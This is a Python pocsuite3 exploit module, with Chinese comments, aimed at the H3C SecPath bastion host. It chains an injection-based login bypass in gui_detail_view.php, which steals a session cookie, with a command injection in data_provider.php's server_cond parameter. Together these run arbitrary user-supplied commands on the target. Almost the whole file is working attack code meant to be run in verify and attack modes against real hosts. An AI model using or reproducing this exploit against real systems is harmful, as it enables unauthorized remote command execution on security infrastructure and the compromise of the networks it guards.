from collections import OrderedDict
from http import cookiejar
from urllib.parse import urljoin
import re
from pocsuite3.api import POCBase, Output, register_poc, logger, requests, OptDict,OptString, VUL_TYPE
from pocsuite3.api import REVERSE_PAYLOAD, POC_CATEGORY
from requests.sessions import session


class ZhongQingPOC(POCBase):
    vulID = '0'# ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = '1'#默认为1
    author = ['luckying']#  PoC作者的大名
    vulDate = '2021-08-04' #漏洞公开的时间,不知道就写今天
    createDate = '2021-08-04'# 编写 PoC 的日期
    updateDate = '2021-08-04'# PoC 更新的时间,默认和编写时间一样
    references = ['http://wiki.peiqi.tech/PeiQi_Wiki/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/H3C/H3C%20SecParh%E5%A0%A1%E5%9E%92%E6%9C%BA%20data_provider.php%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html?h=app%3D%22H3C-SecPath-%E8%BF%90%E7%BB%B4%E5%AE%A1%E8%AE%A1%E7%B3%BB%E7%BB%9F%22']# 漏洞地址来源,0day不用写
    name = 'H3C SecParh堡垒机 data_provider.php 远程命令执行漏洞'# PoC 名称
    appPowerLink = ''# 漏洞厂商主页地址
    appName = 'H3C SecParh堡垒机'# 漏洞应用名称
    appVersion = '2018'# 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION #漏洞类型,类型参考见 漏洞类型规范表
    desc = '''
        需要通过任意用户登录获取cookie，才能执行命令  
    '''# 漏洞简要描述
    samples = ['']# 测试样列,就是用 PoC 测试成功的网站
    install_requires = [] # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = '''
    检测:pocsuite -r .\poc++.py -u url(-f url.txt) --verify 
    利用:pocsuite -r .\poc++.py -u url(-f url.txt) --attack 
    '''
    category = POC_CATEGORY.EXPLOITS.REMOTE

    def _options(self):
        o = OrderedDict()
        o["cmd"] = OptString(default='whoami', description='输入需要执行的命令', require=True)
        return o
    
    def login(self):
        path = "/audit/gui_detail_view.php?token=1&id=%5C&uid="
        url = self.url + path
        #print(url)
        payload = "%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin"
        #print(payload)
        try:
            resq = requests.get(url=url+payload)
            if resq and resq.status_code == 200 and "登录日志" in resq.text:
                #print(resq.text)
                cookie=resq.headers['Set-Cookie']
        except Exception as e:
            pass 
        return cookie
    def _verify(self):
        result = {}
        path = "/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40=&"
        url = self.url + path
        #print(url)
        payload = "server_cond==$(id)&service&identity_cond=&query_type=all&format=json&browse=true"
        #print(payload)
        try:
            cookie=self.login()
            headers={
                'Cookie': cookie
            }
            resq = requests.get(url=url+payload,headers=headers)
            if resq and resq.status_code == 200 and "cmdline" in resq.text:
                #print(resq.text)
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = url
                result['VerifyInfo']['POC'] = payload
        except Exception as e:
            return 
        return self.parse_output(result)

    def trim(str):
        newstr = ''
        for ch in str:          #遍历每一个字符串
            if ch!=' ':
                newstr = newstr+ch
        return newstr

    
    def _attack(self):
        result = {}
        path = "/audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40=&"
        url = self.url + path
        #print(url)
        cmd = self.get_option("cmd")
        payload = "server_cond==$("+cmd+")&service&identity_cond=&query_type=all&format=json&browse=true"
        #print(payload)
        try:
            cookie=self.login()
            headers={
                'Cookie': cookie
            }
            resq = requests.get(url=url+payload,headers=headers)
            t = resq.text 
            t = t.replace('\n', '').replace('\r', '')
            content=re.search(r'server_cond=[\S\s]+?[\S\s]"',t).group()
            print('output >>> '+content)
            t = t.replace(" ","")
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = url
            result['VerifyInfo']['Name'] = t
        except Exception as e:
            return
    def parse_attack(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _shell(self):
        return

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(ZhongQingPOC)